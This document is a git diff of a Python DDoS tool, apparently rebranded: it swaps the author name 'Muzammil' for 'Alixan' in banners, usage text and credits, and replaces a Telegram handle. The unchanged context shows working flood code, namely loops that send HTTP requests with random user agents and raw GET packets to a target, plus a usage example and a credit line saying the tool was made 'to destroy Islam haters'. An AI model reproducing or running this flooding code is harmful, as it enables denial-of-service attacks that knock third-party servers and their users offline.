@@ -1,3 +1,4 @@
+
 import socket
 import sys,os
 from optparse import OptionParser
@@ -11,10 +12,10 @@ from rich.console import Console
 
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-target  = "default"
-ports = 8080
-levels = 3
-fake_ip = "999.999.999"
+target = ""
+ports = 0 
+levels = 0
+fake_ip = ""
 hides = 0
 console = Console()
 already_connected_true = 0
@@ -46,7 +47,7 @@ def get_Typer():
 	global levels
 	global fake_ip
 	global hides
-	optp = OptionParser(add_help_option=False,epilog="MUZAMMIL DDOS ATTACK")
+	optp = OptionParser(add_help_option=False,epilog="Alixan DDOS ATTACK")
 	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	optp.add_option("-i","--ip", dest="host",help="attack to server ip -i ip")
 	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
@@ -105,7 +106,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[Muzammil is attacking...\033[0m")
+			print("\033[Alixan is attacking...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -120,7 +121,7 @@ def my_bots():
 
 #DDOS 1 + MASSEGS
 def attack(item):
-             with console.status("[bold dark_orange] Muzammil is Attacking CTRL+Z .....") as status:
+             with console.status("[bold dark_orange]Alixan is Attacking CTRL+Z .....") as status:
                  while True:
                      try:
                          packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
@@ -241,7 +242,7 @@ def dos_3():
 def usage():
     console = Console()
     MARKDOWN=("""
-         	     Muzammil DDOS ATTACK            """)
+         	     Alixan DDOS ATTACK            """)
     md = Markdown(MARKDOWN)
     console.print(md,style="bold green")   
     
@@ -252,7 +253,7 @@ def usage1():
     console = Console()
     MARKDOWN="""
     		
-	usage : python MuzammilDDOS.py [-i] [-p] [-l]
+	usage : python alixanDDOS.py [-i] [-p] [-l]
         	-h : help
         	-i : server ip
         	-p : port server 
@@ -261,7 +262,7 @@ def usage1():
             -d : Hide message
             	Best lvl =3 
 	example :
-	    python MuzammilDDOS.py -i 12.345.678 -p 80 -l 3"""
+	    python alixanDDOS.py -i 12.345.678 -p 80 -l 3"""
     md = Markdown(MARKDOWN)
     console.print(md,style="bold green")
     #sys.exit()
@@ -284,9 +285,9 @@ def usage2():
 def usage3():
     console = Console()
     MARKDOWN="""
-    Programmer : Muzammil raza
+    Programmer : Dr Alixan
     Made for : Palestine
-    Telegram : @CybeR_mux4mmil
+    Telegram : @alixan046
     Tool Information : I Was Specially Made To Destroy Islam  Haters
 """
     md = Markdown(MARKDOWN)
@@ -415,3 +416,4 @@ if __name__ == "__main__":
             sleep(2)
             usage()
             usage1()
+       
